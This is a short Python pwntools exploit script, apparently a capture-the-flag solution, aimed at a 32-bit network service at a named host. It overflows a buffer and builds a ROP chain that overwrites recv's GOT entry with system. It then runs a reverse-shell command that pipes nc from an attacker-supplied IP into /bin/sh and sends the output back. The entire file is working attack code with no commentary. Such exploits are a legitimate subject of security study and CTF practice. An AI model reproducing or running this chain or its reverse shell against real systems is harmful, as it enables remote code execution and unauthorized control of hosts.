from pwn import *
import time

ret = 0x80484bb
popret = 0x80484dc
pop2ret = 0x80486a2
pop4ret = 0x80489cc
pop3ret = 0x804878d
recv_plt = 0x080485F0
recv_got = 0x0804A040
send_plt = 0x08048610
puts_plt = 0x08048550
puts_got = 0x0804A018
data = 0x0804A08C
func = 0x080486F3
system = 0xf7e4bda0

cmd = "nc {ip} 8080 | /bin/sh | nc {ip} 8081\x00"
payload ="a"*(0x408+4)
payload+=p32(recv_plt)  # write cmd in .data
payload+=p32(pop4ret)
payload+=p32(4)
payload+=p32(data)
payload+=p32(len(cmd))
payload+=p32(0)
payload+=p32(recv_plt)  # overwrite recv_got with system
payload+=p32(pop4ret)   
payload+=p32(4)
payload+=p32(recv_got)
payload+=p32(4)
payload+=p32(0)
payload+=p32(recv_plt)  # system call
payload+=p32(0)
payload+=p32(data)

s = connect("stealthee.kr", 7777)
print s.recv()
s.send(payload)
time.sleep(0.5)
s.send(cmd)
time.sleep(0.5)
s.send(p32(system))
s.interactive()
